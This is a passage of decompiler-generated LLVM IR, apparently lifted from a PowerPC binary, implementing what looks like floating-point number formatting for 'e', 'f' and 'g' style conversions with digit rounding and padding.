  %v2_10010f8c = icmp ugt i32 %v0_10010f8c, 96
  %v3_10010f8c = icmp eq i32 %v0_10010f8c, 96
  store i1 %v1_10010f8c, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10010f8c, i1* %cr7_eq.global-to-local, align 1
  br i1 %v2_10010f8c, label %dec_label_pc_10010fa4, label %dec_label_pc_10010f94

dec_label_pc_10010f94:                            ; preds = %dec_label_pc_10010f8c
  %v1_10010f9c = add i32 %v0_10010f8c, 32
  store i32 %v1_10010f9c, i32* %r0.global-to-local, align 4
  %v1_10010fa0 = urem i32 %v1_10010f9c, 256
  store i32 %v1_10010fa0, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10010fa4

dec_label_pc_10010fa4:                            ; preds = %dec_label_pc_10010f8c, %dec_label_pc_10010f94
  %v0_10010fbc = phi i32 [ %v1_10010fa0, %dec_label_pc_10010f94 ], [ %v0_10010f8c, %dec_label_pc_10010f8c ]
  %stack_var_-194.0 = phi i32 [ 69, %dec_label_pc_10010f94 ], [ 101, %dec_label_pc_10010f8c ]
  %v1_10010fa4 = icmp slt i32 %v0_10010fbc, 103
  %v3_10010fa4 = icmp eq i32 %v0_10010fbc, 103
  store i1 %v1_10010fa4, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10010fa4, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10010fa4, label %dec_label_pc_10010fac, label %dec_label_pc_10010fbc

dec_label_pc_10010fac:                            ; preds = %dec_label_pc_10010fa4
  %v0_10010fac = load i32, i32* %r30.global-to-local, align 4
  %v1_10010fac = icmp slt i32 %v0_10010fac, 0
  %v3_10010fac = icmp eq i32 %v0_10010fac, 0
  store i1 %v1_10010fac, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10010fac, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10010fac, label %dec_label_pc_10010fc4, label %dec_label_pc_10010fb4

dec_label_pc_10010fb4:                            ; preds = %dec_label_pc_10010fac
  %v1_10010fb4 = add i32 %v0_10010fac, -1
  store i32 %v1_10010fb4, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_10010fc4

dec_label_pc_10010fbc:                            ; preds = %dec_label_pc_10010fa4
  %v1_10010fbc = icmp slt i32 %v0_10010fbc, 102
  %v3_10010fbc = icmp eq i32 %v0_10010fbc, 102
  store i1 %v1_10010fbc, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10010fbc, i1* %cr7_eq.global-to-local, align 1
  %v0_10010fcc = load i32, i32* %r30.global-to-local, align 4
  br i1 %v3_10010fbc, label %dec_label_pc_10010fcc, label %dec_label_pc_10010fc4

dec_label_pc_10010fc4:                            ; preds = %dec_label_pc_10010fbc, %dec_label_pc_10010fac, %dec_label_pc_10010fb4
  %v0_10010fc4 = phi i32 [ 0, %dec_label_pc_10010fac ], [ %v1_10010fb4, %dec_label_pc_10010fb4 ], [ %v0_10010fcc, %dec_label_pc_10010fbc ]
  store i32 %v0_10010fc4, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_10010ff0

dec_label_pc_10010fcc:                            ; preds = %dec_label_pc_10010fbc
  %v1_10010fcc = load i32, i32* %r5.global-to-local, align 4
  %v2_10010fcc = add i32 %v1_10010fcc, %v0_10010fcc
  store i32 %v2_10010fcc, i32* %r10.global-to-local, align 4
  %v1_10010fd0 = icmp slt i32 %v2_10010fcc, -1
  %v3_10010fd0 = icmp eq i32 %v2_10010fcc, -1
  store i1 %v1_10010fd0, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10010fd0, i1* %cr7_eq.global-to-local, align 1
  %tmp77 = icmp sgt i32 %v2_10010fcc, -2
  br i1 %tmp77, label %dec_label_pc_10010ff0, label %dec_label_pc_10010fd8

dec_label_pc_10010fd8:                            ; preds = %dec_label_pc_10010fcc
  store i32 17, i32* %r5.global-to-local, align 4
  %v2_10010fdc = ptrtoint i32* %stack_var_-178 to i32
  store i32 %v2_10010fdc, i32* %r3.global-to-local, align 4
  store i32 48, i32* %r4.global-to-local, align 4
  store i32 268505064, i32* @lr, align 4
  %v3_10010fe4 = call i32 @function_1000dd4c(i32 %v2_10010fdc, i32 48, i32 17)
  store i32 %v3_10010fe4, i32* %r3.global-to-local, align 4
  store i32 -1, i32* %r10.global-to-local, align 4
  store i32 -1, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_10010ff0

dec_label_pc_10010ff0:                            ; preds = %dec_label_pc_10010fcc, %dec_label_pc_10010fc4, %dec_label_pc_10010fd8
  %v1_10011014 = phi i32 [ %v2_10010fcc, %dec_label_pc_10010fcc ], [ %v0_10010fc4, %dec_label_pc_10010fc4 ], [ -1, %dec_label_pc_10010fd8 ]
  %v1_10010ff4 = icmp slt i32 %v1_10011014, 16
  %v2_10010ff4 = icmp sgt i32 %v1_10011014, 16
  %v3_10010ff4 = icmp eq i32 %v1_10011014, 16
  store i1 %v1_10010ff4, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10010ff4, i1* %cr7_eq.global-to-local, align 1
  store i32 0, i32* %stack_var_-178, align 4
  store i32 48, i32* %r0.global-to-local, align 4
  store i32 48, i32* %stack_var_-177, align 4
  %v2_10011004 = ptrtoint i32* %stack_var_-159 to i32
  store i32 %v2_10011004, i32* %r11.global-to-local, align 4
  store i32 0, i32* %r8.global-to-local, align 4
  br i1 %v2_10010ff4, label %dec_label_pc_1001102c, label %dec_label_pc_10011010

dec_label_pc_10011010:                            ; preds = %dec_label_pc_10010ff0
  %v2_10011010 = ptrtoint i32* %stack_var_-177 to i32
  %v2_10011014 = add i32 %v1_10011014, %v2_10011010
  store i32 %v2_10011014, i32* %r9.global-to-local, align 4
  %v1_10011018 = add i32 %v2_10011014, 2
  %v2_10011018 = inttoptr i32 %v1_10011018 to i8*
  %v3_10011018 = load i8, i8* %v2_10011018, align 1
  %v4_10011018 = zext i8 %v3_10011018 to i32
  store i32 %v4_10011018, i32* %r0.global-to-local, align 4
  store i32 %v1_10011018, i32* %r11.global-to-local, align 4
  %v1_10011020 = sub nsw i32 52, %v4_10011018
  %v2_10011020 = sub nuw nsw i32 -1, %v4_10011018
  %not.v5_10011020 = icmp ugt i32 %v1_10011020, %v2_10011020
  %v1_10011028 = zext i1 %not.v5_10011020 to i32
  store i32 %v1_10011028, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_1001102c

dec_label_pc_1001102c:                            ; preds = %dec_label_pc_10010ff0, %dec_label_pc_10011010, %dec_label_pc_1001102c.backedge
  %v0_10011030 = phi i32 [ %v0_10011030.pre, %dec_label_pc_1001102c.backedge ], [ 0, %dec_label_pc_10010ff0 ], [ %v1_10011028, %dec_label_pc_10011010 ]
  %v0_1001102c = phi i32 [ %v0_1001102c.pre, %dec_label_pc_1001102c.backedge ], [ %v2_10011004, %dec_label_pc_10010ff0 ], [ %v1_10011018, %dec_label_pc_10011010 ]
  %v1_1001102c = add i32 %v0_1001102c, -1
  %v2_1001102c = inttoptr i32 %v1_1001102c to i8*
  %v3_1001102c = load i8, i8* %v2_1001102c, align 1
  %v4_1001102c = zext i8 %v3_1001102c to i32
  store i32 %v1_1001102c, i32* %r11.global-to-local, align 4
  %v2_10011030 = add i32 %v4_1001102c, %v0_10011030
  store i32 %v2_10011030, i32* %r0.global-to-local, align 4
  %v1_10011034 = urem i32 %v2_10011030, 256
  store i32 %v1_10011034, i32* %r9.global-to-local, align 4
  %v1_10011038 = trunc i32 %v2_10011030 to i8
  store i8 %v1_10011038, i8* %v2_1001102c, align 1
  %v0_1001103c = load i32, i32* %r9.global-to-local, align 4
  %v1_1001103c = icmp slt i32 %v0_1001103c, 48
  %v3_1001103c = icmp eq i32 %v0_1001103c, 48
  store i1 %v1_1001103c, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1001103c, i1* %cr7_eq.global-to-local, align 1
  %v1_10011040 = icmp ult i32 %v0_1001103c, 57
  %v2_10011040 = icmp ugt i32 %v0_1001103c, 57
  %v3_10011040 = icmp eq i32 %v0_1001103c, 57
  store i1 %v1_10011040, i1* %cr6_lt.global-to-local, align 1
  store i1 %v2_10011040, i1* %cr6_gt.global-to-local, align 1
  store i1 %v3_10011040, i1* %cr6_eq.global-to-local, align 1
  %brmerge = or i1 %v3_1001103c, %v2_10011040
  br i1 %brmerge, label %dec_label_pc_1001102c.backedge, label %dec_label_pc_1001104c

dec_label_pc_1001102c.backedge:                   ; preds = %dec_label_pc_1001102c
  %v0_1001102c.pre = load i32, i32* %r11.global-to-local, align 4
  %v0_10011030.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_1001102c

dec_label_pc_1001104c:                            ; preds = %dec_label_pc_1001102c
  %v2_1001104c = ptrtoint i32* %stack_var_-177 to i32
  store i32 %v2_1001104c, i32* %r0.global-to-local, align 4
  %v0_10011050 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_10011050, i32* @r7, align 4
  %v0_10011054 = load i32, i32* %r11.global-to-local, align 4
  %v2_10011054 = icmp ult i32 %v0_10011054, %v2_1001104c
  %v3_10011054 = icmp ugt i32 %v0_10011054, %v2_1001104c
  %v4_10011054 = icmp eq i32 %v0_10011054, %v2_1001104c
  store i1 %v2_10011054, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_10011054, i1* %cr7_eq.global-to-local, align 1
  store i32 %v2_10010ee0, i32* %r9.global-to-local, align 4
  br i1 %v3_10011054, label %dec_label_pc_1001106c, label %dec_label_pc_10011060

dec_label_pc_10011060:                            ; preds = %dec_label_pc_1001104c
  store i32 %v2_1001104c, i32* %r9.global-to-local, align 4
  %v1_10011064 = add i32 %v0_10011050, 1
  store i32 %v1_10011064, i32* @r7, align 4
  store i32 %v2_1001104c, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_1001106c

dec_label_pc_1001106c:                            ; preds = %dec_label_pc_1001104c, %dec_label_pc_10011060
  %v2_10011074 = phi i32 [ %v0_10011054, %dec_label_pc_1001104c ], [ %v2_1001104c, %dec_label_pc_10011060 ]
  %v0_1001106c = load i32, i32* %r31.global-to-local, align 4
  %v1_1001106c = icmp slt i32 %v0_1001106c, 103
  %v3_1001106c = icmp eq i32 %v0_1001106c, 103
  store i1 %v1_1001106c, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1001106c, i1* %cr7_eq.global-to-local, align 1
  store i32 0, i32* %r0.global-to-local, align 4
  %v3_10011074 = add i32 %v2_10011074, 1
  %v4_10011074 = inttoptr i32 %v3_10011074 to i8*
  store i8 0, i8* %v4_10011074, align 1
  %v0_10011078 = load i32, i32* %r11.global-to-local, align 4
  %v1_10011078 = add i32 %v0_10011078, 1
  store i32 %v1_10011078, i32* %r11.global-to-local, align 4
  %v0_1001107c = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_1001107c, label %dec_label_pc_10011080, label %dec_label_pc_100110a4

dec_label_pc_10011080:                            ; preds = %dec_label_pc_1001106c
  %v0_10011080 = load i32, i32* @r7, align 4
  %v1_10011080 = icmp slt i32 %v0_10011080, -4
  %v3_10011080 = icmp eq i32 %v0_10011080, -4
  store i1 %v1_10011080, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10011080, i1* %cr7_eq.global-to-local, align 1
  br i1 %v1_10011080, label %dec_label_pc_1001109c, label %dec_label_pc_10011088

dec_label_pc_10011088:                            ; preds = %dec_label_pc_10011080
  %v1_10011088 = load i32, i32* %r10.global-to-local, align 4
  %v2_10011088 = icmp sgt i32 %v1_10011088, %v0_10011080
  %v3_10011088 = icmp slt i32 %v1_10011088, %v0_10011080
  %v4_10011088 = icmp eq i32 %v1_10011088, %v0_10011080
  store i1 %v2_10011088, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_10011088, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10011088, label %dec_label_pc_1001109c, label %dec_label_pc_10011090

dec_label_pc_10011090:                            ; preds = %dec_label_pc_10011088
  %v2_10011090 = sub i32 %v1_10011088, %v0_10011080
  store i32 %v2_10011090, i32* %r30.global-to-local, align 4
  store i32 102, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_100110bc

dec_label_pc_1001109c:                            ; preds = %dec_label_pc_10011088, %dec_label_pc_10011080
  store i32 103, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_100110b0

dec_label_pc_100110a4:                            ; preds = %dec_label_pc_1001106c
  %v0_100110a4 = load i32, i32* %r31.global-to-local, align 4
  %v1_100110a4 = icmp slt i32 %v0_100110a4, 102
  %v3_100110a4 = icmp eq i32 %v0_100110a4, 102
  store i1 %v1_100110a4, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_100110a4, i1* %cr7_eq.global-to-local, align 1
  store i32 %v0_100110a4, i32* %r4.global-to-local, align 4
  br i1 %v3_100110a4, label %dec_label_pc_100110bcthread-pre-split, label %dec_label_pc_100110b0

dec_label_pc_100110b0:                            ; preds = %dec_label_pc_100110a4, %dec_label_pc_1001109c
  store i32 0, i32* %r10.global-to-local, align 4
  store i1 false, i1* %cr6_lt.global-to-local, align 1
  store i1 false, i1* %cr6_gt.global-to-local, align 1
  store i1 true, i1* %cr6_eq.global-to-local, align 1
  br label %dec_label_pc_100110d0

dec_label_pc_100110bcthread-pre-split:            ; preds = %dec_label_pc_100110a4
  %v0_100110bc.pr = load i32, i32* @r7, align 4
  br label %dec_label_pc_100110bc

dec_label_pc_100110bc:                            ; preds = %dec_label_pc_100110bcthread-pre-split, %dec_label_pc_10011090
  %v0_100110c0 = phi i32 [ %v0_100110bc.pr, %dec_label_pc_100110bcthread-pre-split ], [ %v0_10011080, %dec_label_pc_10011090 ]
  %v1_100110bc = icmp slt i32 %v0_100110c0, 0
  %v2_100110bc = icmp sgt i32 %v0_100110c0, 0
  %v3_100110bc = icmp eq i32 %v0_100110c0, 0
  store i1 %v1_100110bc, i1* %cr6_lt.global-to-local, align 1
  store i1 %v2_100110bc, i1* %cr6_gt.global-to-local, align 1
  store i1 %v3_100110bc, i1* %cr6_eq.global-to-local, align 1
  store i32 %v0_100110c0, i32* %r10.global-to-local, align 4
  %tmp78 = icmp sgt i32 %v0_100110c0, -1
  br i1 %tmp78, label %dec_label_pc_100110d0, label %dec_label_pc_100110c8

dec_label_pc_100110c8:                            ; preds = %dec_label_pc_100110bc
  store i32 48, i32* %r0.global-to-local, align 4
  %v2_100110cc = load i32, i32* %r9.global-to-local, align 4
  %v3_100110cc = add i32 %v2_100110cc, -1
  %v4_100110cc = inttoptr i32 %v3_100110cc to i8*
  store i8 48, i8* %v4_100110cc, align 1
  store i32 %v3_100110cc, i32* %r9.global-to-local, align 4
  %v1_100110f0.pre = load i32, i32* %r11.global-to-local, align 4
  %v0_10011100.pre = load i1, i1* %cr6_lt.global-to-local, align 1
  br label %dec_label_pc_100110d0

dec_label_pc_100110d0:                            ; preds = %dec_label_pc_100110bc, %dec_label_pc_100110b0, %dec_label_pc_100110c8
  %v0_10011100 = phi i1 [ %v1_100110bc, %dec_label_pc_100110bc ], [ false, %dec_label_pc_100110b0 ], [ %v0_10011100.pre, %dec_label_pc_100110c8 ]
  %v1_100110f0 = phi i32 [ %v1_10011078, %dec_label_pc_100110bc ], [ %v1_10011078, %dec_label_pc_100110b0 ], [ %v1_100110f0.pre, %dec_label_pc_100110c8 ]
  store i32 176, i32* %r5.global-to-local, align 4
  store i32 1, i32* %stack_var_-140, align 4
  %v0_100110e4 = load i32, i32* %r9.global-to-local, align 4
  %v1_100110e4 = add i32 %v0_100110e4, 1
  store i32 %v1_100110e4, i32* %r6.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_100110f0 = sub i32 %v1_100110f0, %v1_100110e4
  store i32 %v2_100110f0, i32* %r11.global-to-local, align 4
  %v1_100110f4 = inttoptr i32 %v0_100110e4 to i8*
  %v2_100110f4 = load i8, i8* %v1_100110f4, align 1
  %v3_100110f4 = zext i8 %v2_100110f4 to i32
  store i32 %v3_100110f4, i32* %r9.global-to-local, align 4
  br i1 %v0_10011100, label %dec_label_pc_10011160, label %dec_label_pc_10011104

dec_label_pc_10011104:                            ; preds = %dec_label_pc_100110d0
  %v0_10011104 = load i32, i32* %r10.global-to-local, align 4
  %v2_10011104 = icmp slt i32 %v0_10011104, %v2_100110f0
  %v4_10011104 = icmp eq i32 %v0_10011104, %v2_100110f0
  store i1 %v2_10011104, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_10011104, i1* %cr7_eq.global-to-local, align 1
  store i32 112, i32* %r0.global-to-local, align 4
  store i32 112, i32* %stack_var_-132, align 4
  br i1 %v2_10011104, label %dec_label_pc_10011158, label %dec_label_pc_10011118

dec_label_pc_10011118:                            ; preds = %dec_label_pc_10011104
  %v2_10011118 = sub i32 %v0_10011104, %v2_100110f0
  store i32 %v2_10011118, i32* %r0.global-to-local, align 4
  %v4_10011118 = icmp sgt i32 %v2_10011118, 0
  store i32 -1, i32* %r10.global-to-local, align 4
  br i1 %v4_10011118, label %dec_label_pc_10011134, label %dec_label_pc_10011124

dec_label_pc_10011124:                            ; preds = %dec_label_pc_10011118
  %v2_10011128 = ptrtoint i32* %stack_var_-120 to i32
  store i32 %v2_10011128, i32* @r8, align 4
  store i32 0, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_1001117c

dec_label_pc_10011134:                            ; preds = %dec_label_pc_10011118
  store i32 ptrtoint (i32* @global_var_1001a493.799 to i32), i32* %r9.global-to-local, align 4
  %v2_10011140 = ptrtoint i32* %stack_var_-108 to i32
  store i32 %v2_10011140, i32* @r8, align 4
  store i32 0, i32* %r11.global-to-local, align 4
  store i32 176, i32* %stack_var_-120, align 4
  br label %dec_label_pc_1001117c

dec_label_pc_10011158:                            ; preds = %dec_label_pc_10011104
  %v0_10011158 = load i1, i1* %cr6_gt.global-to-local, align 1
  br i1 %v0_10011158, label %dec_label_pc_10011168, label %dec_label_pc_1001115c

dec_label_pc_1001115c:                            ; preds = %dec_label_pc_10011158
  store i32 -1, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_10011160

dec_label_pc_10011160:                            ; preds = %dec_label_pc_100110d0, %dec_label_pc_1001115c
  %v2_10011160 = ptrtoint i32* %stack_var_-132 to i32
  store i32 %v2_10011160, i32* @r8, align 4
  br label %dec_label_pc_1001117c

dec_label_pc_10011168:                            ; preds = %dec_label_pc_10011158
  %v2_10011168 = sub i32 %v2_100110f0, %v0_10011104
  store i32 %v2_10011168, i32* %r11.global-to-local, align 4
  %v2_10011170 = add i32 %v0_10011104, %v1_100110e4
  store i32 %v2_10011170, i32* %r6.global-to-local, align 4
  %v2_10011174 = ptrtoint i32* %stack_var_-120 to i32
  store i32 %v2_10011174, i32* @r8, align 4
  store i32 -1, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_1001117c

dec_label_pc_1001117c:                            ; preds = %dec_label_pc_10011160, %dec_label_pc_10011134, %dec_label_pc_10011124, %dec_label_pc_10011168
  %v1_100111a8 = phi i32 [ %v2_10011160, %dec_label_pc_10011160 ], [ %v2_10011140, %dec_label_pc_10011134 ], [ %v2_10011128, %dec_label_pc_10011124 ], [ %v2_10011174, %dec_label_pc_10011168 ]
  %v0_10011188 = phi i32 [ %v2_100110f0, %dec_label_pc_10011160 ], [ 0, %dec_label_pc_10011134 ], [ 0, %dec_label_pc_10011124 ], [ %v2_10011168, %dec_label_pc_10011168 ]
  %v3_1001117c = load i32, i32* %v2_10010d4c, align 4
  store i32 %v3_1001117c, i32* %r0.global-to-local, align 4
  %v1_10011180 = and i32 %v3_1001117c, 16
  store i32 %v1_10011180, i32* %r9.global-to-local, align 4
  %v3_10011180 = icmp eq i32 %v1_10011180, 0
  br i1 %v3_10011180, label %dec_label_pc_10011188, label %dec_label_pc_100111a0

dec_label_pc_10011188:                            ; preds = %dec_label_pc_1001117c
  %v1_10011188 = icmp slt i32 %v0_10011188, 0
  %v3_10011188 = icmp eq i32 %v0_10011188, 0
  store i1 %v1_10011188, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10011188, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10011188, label %dec_label_pc_10011190, label %dec_label_pc_100111a0

dec_label_pc_10011190:                            ; preds = %dec_label_pc_10011188
  %v0_10011190 = load i32, i32* %r31.global-to-local, align 4
  %v1_10011190 = icmp slt i32 %v0_10011190, 103
  %v3_10011190 = icmp eq i32 %v0_10011190, 103
  store i1 %v1_10011190, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10011190, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10011190, label %dec_label_pc_100111c0, label %dec_label_pc_10011198

dec_label_pc_10011198:                            ; preds = %dec_label_pc_10011190
  %v0_10011198 = load i32, i32* %r30.global-to-local, align 4
  %v1_10011198 = icmp slt i32 %v0_10011198, 0
  %v3_10011198 = icmp eq i32 %v0_10011198, 0
  store i1 %v1_10011198, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10011198, i1* %cr7_eq.global-to-local, align 1
  %tmp79 = icmp slt i32 %v0_10011198, 1
  br i1 %tmp79, label %dec_label_pc_100111c0, label %dec_label_pc_100111a0

dec_label_pc_100111a0:                            ; preds = %dec_label_pc_10011188, %dec_label_pc_1001117c, %dec_label_pc_10011198
  %v2_100111a8 = inttoptr i32 %v1_100111a8 to i32*
  store i32 112, i32* %v2_100111a8, align 4
  store i32 ptrtoint (i32* @global_var_1001a4a0.800 to i32), i32* %r9.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  %v1_100111b4 = load i32, i32* @r8, align 4
  %v2_100111b4 = add i32 %v1_100111b4, 8
  %v3_100111b4 = inttoptr i32 %v2_100111b4 to i32*
  store i32 ptrtoint (i32* @global_var_1001a4a0.800 to i32), i32* %v3_100111b4, align 4
  %v0_100111b8 = load i32, i32* %r0.global-to-local, align 4
  %v1_100111b8 = load i32, i32* @r8, align 4
  %v2_100111b8 = add i32 %v1_100111b8, 4
  %v3_100111b8 = inttoptr i32 %v2_100111b8 to i32*
  store i32 %v0_100111b8, i32* %v3_100111b8, align 4
  %v0_100111bc = load i32, i32* @r8, align 4
  %v1_100111bc = add i32 %v0_100111bc, 12
  store i32 %v1_100111bc, i32* @r8, align 4
  br label %dec_label_pc_100111c0

dec_label_pc_100111c0:                            ; preds = %dec_label_pc_10011198, %dec_label_pc_10011190, %dec_label_pc_100111a0
  %v1_100111d0 = phi i32 [ %v1_100111a8, %dec_label_pc_10011198 ], [ %v1_100111a8, %dec_label_pc_10011190 ], [ %v1_100111bc, %dec_label_pc_100111a0 ]
  %v0_100111c0 = load i32, i32* %r10.global-to-local, align 4
  %v1_100111c0 = add i32 %v0_100111c0, 1
  store i32 %v1_100111c0, i32* %r10.global-to-local, align 4
  %v4_100111c0 = icmp eq i32 %v1_100111c0, 0
  br i1 %v4_100111c0, label %dec_label_pc_100111e8, label %dec_label_pc_100111c8

dec_label_pc_100111c8:                            ; preds = %dec_label_pc_100111c0
  %v1_100111c8 = sub i32 -1, %v0_100111c0
  store i32 176, i32* %r0.global-to-local, align 4
  %v2_100111d0 = add i32 %v1_100111d0, 4
  %v3_100111d0 = inttoptr i32 %v2_100111d0 to i32*
  store i32 %v1_100111c8, i32* %v3_100111d0, align 4
  store i32 ptrtoint (i32* @global_var_1001a493.799 to i32), i32* %r9.global-to-local, align 4
  %v0_100111dc = load i32, i32* %r0.global-to-local, align 4
  %v1_100111dc = load i32, i32* @r8, align 4
  %v2_100111dc = inttoptr i32 %v1_100111dc to i32*
  store i32 %v0_100111dc, i32* %v2_100111dc, align 4
  %v0_100111e0 = load i32, i32* %r9.global-to-local, align 4
  %v1_100111e0 = load i32, i32* @r8, align 4
  %v2_100111e0 = add i32 %v1_100111e0, 8
  %v3_100111e0 = inttoptr i32 %v2_100111e0 to i32*
  store i32 %v0_100111e0, i32* %v3_100111e0, align 4
  %v0_100111e4 = load i32, i32* @r8, align 4
  %v1_100111e4 = add i32 %v0_100111e4, 12
  store i32 %v1_100111e4, i32* @r8, align 4
  br label %dec_label_pc_100111e8

dec_label_pc_100111e8:                            ; preds = %dec_label_pc_100111c0, %dec_label_pc_100111c8
  %v1_100111f4 = phi i32 [ %v1_100111d0, %dec_label_pc_100111c0 ], [ %v1_100111e4, %dec_label_pc_100111c8 ]
  %v0_100111e8 = load i32, i32* %r11.global-to-local, align 4
  %v1_100111e8 = icmp slt i32 %v0_100111e8, 0
  %v3_100111e8 = icmp eq i32 %v0_100111e8, 0
  store i1 %v1_100111e8, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_100111e8, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_100111e8, label %dec_label_pc_10011204, label %dec_label_pc_100111f0

dec_label_pc_100111f0:                            ; preds = %dec_label_pc_100111e8
  store i32 112, i32* %r0.global-to-local, align 4
  %v0_100111f4 = load i32, i32* %r6.global-to-local, align 4
  %v2_100111f4 = add i32 %v1_100111f4, 8
  %v3_100111f4 = inttoptr i32 %v2_100111f4 to i32*
  store i32 %v0_100111f4, i32* %v3_100111f4, align 4
  %v0_100111f8 = load i32, i32* %r0.global-to-local, align 4
  %v1_100111f8 = load i32, i32* @r8, align 4
  %v2_100111f8 = inttoptr i32 %v1_100111f8 to i32*
  store i32 %v0_100111f8, i32* %v2_100111f8, align 4
  %v0_100111fc = load i32, i32* %r11.global-to-local, align 4
  %v1_100111fc = load i32, i32* @r8, align 4
  %v2_100111fc = add i32 %v1_100111fc, 4
  %v3_100111fc = inttoptr i32 %v2_100111fc to i32*
  store i32 %v0_100111fc, i32* %v3_100111fc, align 4
  %v0_10011200 = load i32, i32* @r8, align 4
  %v1_10011200 = add i32 %v0_10011200, 12
  store i32 %v1_10011200, i32* @r8, align 4
  br label %dec_label_pc_10011204

dec_label_pc_10011204:                            ; preds = %dec_label_pc_100111e8, %dec_label_pc_100111f0
  %v1_1001122c = phi i32 [ %v1_100111f4, %dec_label_pc_100111e8 ], [ %v1_10011200, %dec_label_pc_100111f0 ]
  %v0_10011204 = load i32, i32* %r31.global-to-local, align 4
  %v1_10011204 = icmp slt i32 %v0_10011204, 103
  %v3_10011204 = icmp eq i32 %v0_10011204, 103
  store i1 %v1_10011204, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10011204, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10011204, label %dec_label_pc_1001120c, label %dec_label_pc_10011218

dec_label_pc_1001120c:                            ; preds = %dec_label_pc_10011204
  %v3_1001120c = load i32, i32* %v2_10010d4c, align 4
  store i32 %v3_1001120c, i32* %r0.global-to-local, align 4
  %v1_10011210 = and i32 %v3_1001120c, 16
  store i32 %v1_10011210, i32* %r9.global-to-local, align 4
  %v3_10011210 = icmp eq i32 %v1_10011210, 0
  br i1 %v3_10011210, label %dec_label_pc_10011244, label %dec_label_pc_10011218

dec_label_pc_10011218:                            ; preds = %dec_label_pc_10011204, %dec_label_pc_1001120c
  %v0_10011218 = load i32, i32* %r10.global-to-local, align 4
  %v1_10011218 = load i32, i32* %r11.global-to-local, align 4
  %v2_10011218 = sub i32 %v1_10011218, %v0_10011218
  store i32 %v2_10011218, i32* %r9.global-to-local, align 4
  %v1_1001121c = load i32, i32* %r30.global-to-local, align 4
  %v2_1001121c = icmp sgt i32 %v1_1001121c, %v2_10011218
  %v4_1001121c = icmp eq i32 %v1_1001121c, %v2_10011218
  store i1 %v2_1001121c, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_1001121c, i1* %cr7_eq.global-to-local, align 1
  br i1 %v2_1001121c, label %dec_label_pc_10011224, label %dec_label_pc_10011244

dec_label_pc_10011224:                            ; preds = %dec_label_pc_10011218
  %v2_10011224 = sub i32 %v1_1001121c, %v2_10011218
  store i32 176, i32* %r0.global-to-local, align 4
  %v2_1001122c = add i32 %v1_1001122c, 4
  %v3_1001122c = inttoptr i32 %v2_1001122c to i32*
  store i32 %v2_10011224, i32* %v3_1001122c, align 4
  store i32 ptrtoint (i32* @global_var_1001a493.799 to i32), i32* %r9.global-to-local, align 4
  %v0_10011238 = load i32, i32* %r0.global-to-local, align 4
  %v1_10011238 = load i32, i32* @r8, align 4
  %v2_10011238 = inttoptr i32 %v1_10011238 to i32*
  store i32 %v0_10011238, i32* %v2_10011238, align 4
  %v0_1001123c = load i32, i32* %r9.global-to-local, align 4
  %v1_1001123c = load i32, i32* @r8, align 4
  %v2_1001123c = add i32 %v1_1001123c, 8
  %v3_1001123c = inttoptr i32 %v2_1001123c to i32*
  store i32 %v0_1001123c, i32* %v3_1001123c, align 4
  %v0_10011240 = load i32, i32* @r8, align 4
  %v1_10011240 = add i32 %v0_10011240, 12
  store i32 %v1_10011240, i32* @r8, align 4
  br label %dec_label_pc_10011244

dec_label_pc_10011244:                            ; preds = %dec_label_pc_10011218, %dec_label_pc_1001120c, %dec_label_pc_10011224
  %v1_100112d837 = phi i32 [ %v1_1001122c, %dec_label_pc_10011218 ], [ %v1_1001122c, %dec_label_pc_1001120c ], [ %v1_10011240, %dec_label_pc_10011224 ]
  %v0_10011244 = load i32, i32* %r4.global-to-local, align 4
  %v1_10011244 = icmp slt i32 %v0_10011244, 102
  %v3_10011244 = icmp eq i32 %v0_10011244, 102
  store i1 %v1_10011244, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10011244, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10011244, label %dec_label_pc_100112cc, label %dec_label_pc_1001124c

dec_label_pc_1001124c:                            ; preds = %dec_label_pc_10011244
  %v0_1001124c = load i32, i32* @r7, align 4
  %v1_1001124c = icmp slt i32 %v0_1001124c, 0
  %v3_1001124c = icmp eq i32 %v0_1001124c, 0
  store i1 %v1_1001124c, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1001124c, i1* %cr7_eq.global-to-local, align 1
